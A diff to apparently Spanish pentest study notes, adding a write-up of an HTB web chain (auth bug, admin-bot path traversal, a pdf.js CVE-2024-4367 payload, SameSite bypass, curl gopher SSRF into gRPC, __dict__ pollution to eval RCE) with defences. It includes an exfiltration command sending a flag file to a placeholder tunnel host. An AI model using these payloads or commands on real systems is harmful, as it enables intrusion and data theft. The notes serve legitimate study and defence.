@@ -1,8 +1,8 @@
 # 🧰 ARSENAL — herramientas y técnicas de pentest (HTB + prep de entrevista)
 
 > Compilado para **estudio / CV / prep de entrevista de pentest**. Cada técnica va con *qué es*, *cómo se usa* y su *defensa* (para poder explicarla en pizarra).
-> Boxes de referencia: **Resizer** (Hard web), **Nimbus** (Hard cloud/AWS), **Blinded** (Insane heap pwn).
-> Método reusable en [PLAYBOOK.md](PLAYBOOK.md). Writeups por box: `Resizer.md`, `Nimbus.md`, `Blinded_research-notes.md`.
+> Boxes de referencia: **Resizer** (Hard web), **Nimbus** (Hard cloud/AWS), **ArtificialUniversity** (Insane web, client-side→SSRF→gRPC RCE), **Sandcastle**/**Callfuscated** (Insane pwn/rev), **Blinded** (Insane heap pwn).
+> Método reusable en [PLAYBOOK.md](PLAYBOOK.md). Writeups por box: `Resizer.md`, `Nimbus.md`, `ArtificialUniversity.md`, `Sandcastle.md`, `Callfuscated.md`, `Blinded_research-notes.md`.
 > Referencias madre: HackTricks · PayloadsAllTheThings · hackingthe.cloud · SecLists · GTFOBins/LOLBAS · revshells.com · The Hacker Recipes (AD).
 
 ---
@@ -36,6 +36,30 @@
 | **Deserialización** | `yaml.load()`/pickle/Java `readObject`/.NET `BinaryFormatter` instancian objetos → RCE. **Nimbus**: worker `yaml.load(Loader=Loader)` | `safe_load`/allow-list de clases; validación por esquema |
 | **JWT** | `alg:none`, secreto débil (crackear con `hashcat -m 16500`), confusión RS/HS | firmar y **verificar** alg; secretos fuertes |
 | **Auth bypass / IDOR** | cambiar IDs, forzar roles, mass-assignment | authz por objeto server-side, no confiar en el cliente |
+
+---
+
+## 2b. 🎓 Cadena client-side → SSRF → gRPC RCE (de ArtificialUniversity — Insane web)
+
+> Cadena larga de web moderna: **bug de lógica → bot admin → CVE de cliente → bypass SameSite → SSRF gopher → RCE en microservicio interno**. Cada eslabón es una técnica reusable. Root final.
+
+**1. Auth bug por rama de código.** Un endpoint con dos caminos (`if product_id:` vs `else:`) donde el check de login solo cubría una rama → la otra quedaba **sin auth y con parámetros sensibles controlables** (precio, `user_id`, `email`). *Lección:* auditar la autorización en **cada** rama; los guard-clauses que solo disparan en un branch dejan huecos. *Defensa:* authz centralizada (decorador/middleware), no por-rama.
+
+**2. Bot "admin" que visita una URL construida con tu input.** Un headless browser privilegiado (Selenium/Firefox) logueado como admin visitaba `.../invoice_{payment_id}.pdf`, con `payment_id` controlado por el atacante → **path traversal** (`/../../../admin/x`) para redirigir al bot a **cualquier endpoint same-origin como admin** = CSRF-GET autenticado. *Defensa:* nunca interpolar input en URLs que abre el bot; canonicalizar/validar; el bot no debe navegar a rutas derivadas de input.
+
+**3. CVE-2024-4367 — JS arbitrario vía pdf.js (Firefox < 126).** Un endpoint "view-pdf" fetcheaba una URL y la servía **same-origin como `application/pdf`** → el visor pdf.js del bot renderiza un PDF malicioso cuyo **`/FontMatrix`** contiene un elemento string no saneado que rompe el JS generado en `getPathGenerator` → **ejecución de JS arbitrario en el origen de la app**. PoC: `/FontMatrix [1 0 0 1 0 (0\); <JS> //)]` sobre un PDF con fuente CFF embebida (glifos que fuercen el path generator). *Pista de diseño:* el Dockerfile **pinea Firefox 125.0.1** (fixeado en 126) — ver §"version-pinning". *Defensa:* actualizar pdf.js ≥4.2.67 / Firefox ≥126; no renderizar PDFs no confiables same-origin.
+
+**4. Bypass de SameSite=Lax con form POST top-level.** El JS del CVE corre en un contexto de **origen opaco** (`document.domain='pdf.js'`): un `fetch`/XHR **subresource NO lleva la cookie de sesión** (cookie sin atributo SameSite → Lax por defecto). Pero un **`<form>` POST top-level** (`f.submit()`) **SÍ** la manda (Lax permite cookie en navegación top-level). Clave: apuntar el form al **host interno que usa el bot** (`http://127.0.0.1:1337`), no a la IP externa — la cookie está atada a ese host. *Defensa:* `SameSite=Strict` + **tokens CSRF** en todo endpoint que cambie estado; no exponer acciones sensibles por GET/POST sin token.
+
+**5. curl gopher SSRF → bytes crudos a un puerto interno.** El endpoint admin corría `curl <url>` con la URL controlada → `gopher://127.0.0.1:50051/_<bytes url-encoded>` envía **cualquier byte a cualquier TCP** (clásico SSRF-a-TCP). *Pista de diseño:* el Dockerfile **compila curl 7.70.0 de fuente** — porque curl viejo **manda NULL bytes** en el selector gopher, mientras **curl 8.x los rechaza** (`URL malformed`); los frames HTTP/2 están llenos de `\x00`, así que el pin de versión es esencial. *Defensa:* en fetchers server-side, allow-list de esquemas (solo http/https), bloquear `gopher/dict/file/…`, resolver+validar destino (no internos/link-local).
+
+**6. gopher → gRPC (HTTP/2 a mano).** Para hablarle a un gRPC interno por gopher, se arman los frames h2 crudos: **preface** (`PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n`) + **SETTINGS** vacío + **HEADERS** (HPACK literal: `:method POST`, `:scheme http`, `:path /paquete.Servicio/Metodo`, `:authority host`, `content-type: application/grpc`, `te: trailers`) + **DATA** (mensaje gRPC = 1 byte flag + 4 bytes len big-endian + protobuf). Varios **streams** (id 1,3,5…) para varias llamadas en un tiro. Encoding protobuf de un `map<string,Msg>`: entry con field1=key, field2=value. *Defensa:* gRPC no debe ser alcanzable por SSRF (network policy); mTLS.
+
+**7. "Prototype pollution" en Python → `eval` RCE.** Un RPC "Debug" hacía un **merge recursivo de un dict del atacante en `self.__dict__`** del servicio → permitía **crear atributos arbitrarios** (ej. `price_formula`), y otro RPC hacía `eval(self.price_formula)` → **RCE como root**. Es el análogo Python de prototype pollution (contaminar el objeto vía `__dict__`). *Defensa:* nunca mergear datos no confiables en atributos de objetos; jamás `eval` sobre datos; validar por esquema estricto.
+
+**8. Version-pinning = pista.** Cuando un Dockerfile **compila de fuente una versión vieja** (curl 7.70.0) o **pinea un browser** (Firefox 125.0.1), asumí que el exploit **depende de un comportamiento específico de esa versión** (aquí: nulls en gopher, y el CVE de pdf.js). Es señal, no ruido.
+
+**Metodología de armado (clave para cadenas largas):** aislar **cada eslabón con un beacon observable** (callback a un listener propio) antes de encadenar; exponer el listener al target cloud con **cloudflared** (tunnel HTTPS); y **validar el crafting más frágil (gopher/HTTP2) localmente** contra el mismo servicio (levantar el gRPC del zip) antes de disparar al target. Exfil final: `eval` server-side hace `curl https://TUN/x?f=$(cat /flag*.txt|base64 -w0)` (base64 para chars seguros).
 
 ---
 
@@ -216,10 +240,18 @@ Cuando el binario es de otra arquitectura (ARM64/MIPS/…) y **no podés instala
 ## 11. Mapa técnica → box (de un vistazo)
 
 ```
-RESIZER (Hard, web)     path traversal → arbitrary write → shadow .so → RCE (worker reboot)
-NIMBUS  (Hard, cloud)   vhost-enum → SSRF (bypass IP decimal) → IMDS creds → SQS YAML deser → RCE
-                        → LocalStack directo :4566 (sin IAM) → CodeBuild → root
-BLINDED (Insane, pwn)   House of Water → [pendiente FSOP]   [parked]
+RESIZER   (Hard, web)     path traversal → arbitrary write → shadow .so → RCE (worker reboot)
+NIMBUS    (Hard, cloud)   vhost-enum → SSRF (bypass IP decimal) → IMDS creds → SQS YAML deser → RCE
+                          → LocalStack directo :4566 (sin IAM) → CodeBuild → root
+ARTIFICIALUNIVERSITY      checkout unauth (precio arbitrario) → bot admin → path-traversal →
+  (Insane, web)           view-pdf same-origin → CVE-2024-4367 (pdf.js/FF125) → JS en origen admin →
+                          form POST top-level (bypass SameSite) → curl 7.70.0 GOPHER → gRPC
+                          DebugService (prototype-pollution __dict__) → eval() → RCE root → exfil flag
+SANDCASTLE (Insane, pwn)  VM Brainfuck (broker+workers seccomp) → arbitrary write (ptr sin bounds)
+                          → open vs popen differential → popen prefix-bypass → flag
+CALLFUSCATED (Insane rev) call-obf + VM bytecode + MBA → devirtualizar dinámico (gdb API) → keystream
+POLY      (Insane, rev)   ARM64, decoys multicapa, /dev/null truco (fd 3) [en progreso]
+BLINDED   (Insane, pwn)   House of Water → [pendiente FSOP]   [parked]
 ```
 
 ---
